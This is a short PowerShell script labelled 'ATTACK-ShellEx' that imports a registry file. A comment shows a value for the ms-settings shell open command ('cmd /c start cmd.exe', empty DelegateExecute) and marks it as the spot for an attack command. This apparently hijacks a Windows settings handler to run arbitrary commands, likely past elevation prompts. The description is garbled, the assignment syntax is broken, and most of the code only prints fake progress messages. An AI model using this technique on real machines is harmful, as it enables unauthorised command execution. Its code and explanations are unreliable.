<#
       .Author @matthomjxi0e Twitter @matthomjxi0e
      
       .subject ATTACK-ShellEx Get-Execution
      
       .Liscense   Powershell
       
       .Description
       @"
    Clarification Simple For This ! This Is For Run operation ATTACK in Some OF
    Windows in Windows Like "Network And Sharing Center both Explorer Or Of Sign Wireless
    Can you Make This The Windows Execute Some Text Of ATTACK Once you press them

    "@


       .Example

       invoke-Attacks-ShellEx -localhost C:\Users\Gihad\Desktop
#>

#-------------------------------------------->

function invoke-Attacks-ShellEx {



    [CmdletBinding()]
    param( 
      $command,$localhost
       #Operation
    )
    


$ShellEx = (
 
    reg import $localhost

    

    # 1 Clarification For Run 
    
    # 2 edit file reg And Additive Vlaue in line The next   
    
 <#
        [HKEY_CLASSES_ROOT\ms-settings\Shell\Open\command]
        @="cmd /c start cmd.exe" <<<<<<< Here can you add Value For Execution With ATTACK
         "DelegateExecute"=""              
 #>

 )

    

     ""
  

   ""
    Write-Host -Object " [*] Please Wait Even-Extraction ATTACK11 " -ForegroundColor Yellow 
   sleep 2

   ""
 


   ""

   Write-Host -Object " [*] Please Wait Currently, the payment process has Push " -ForegroundColor Yellow  
    sleep 1
 

        ""

                    ""

             Write-Host -Object " [*] Mode ATTACK Coming at present => " -ForegroundColor Yellow  
              sleep 1

              ""
              ""
      Write-Host -Object " [*] Complete Operation ATTACK in Listings => " -ForegroundColor Yellow  
        sleep 1

}
invoke-Attacks-ShellEx